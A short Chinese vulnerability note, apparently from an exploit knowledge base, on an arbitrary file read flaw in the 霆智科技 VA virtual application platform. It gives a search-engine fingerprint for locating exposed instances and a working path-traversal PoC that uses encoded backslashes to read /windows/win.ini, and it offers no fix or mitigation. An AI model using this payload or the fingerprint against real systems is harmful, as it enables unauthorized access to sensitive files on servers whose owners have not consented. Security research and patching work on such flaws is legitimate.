# 霆智科技 VA虚拟应用平台 任意文件读取漏洞

## 漏洞描述

霆智科技 VA虚拟应用平台 存在任意文件读取漏洞，攻击者通过漏洞可以获取服务器中敏感信息

## 漏洞影响

<a-checkbox checked>霆智科技 VA虚拟应用平台</a-checkbox></br>

## 网络测绘

<a-checkbox checked>body="EAA益和应用接入系统"</a-checkbox></br>

## 漏洞复现

登陆页面

![img](../../../.vuepress/public/img/1683073057116-3fcea542-7aec-4fde-9ad1-ba4ec639c17e.png)

验证POC

```python
/..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c/windows/win.ini
```

![img](../../../.vuepress/public/img/1683073234358-a1e4cecc-48c7-4509-b2cb-70d0bfaa9fc6.png)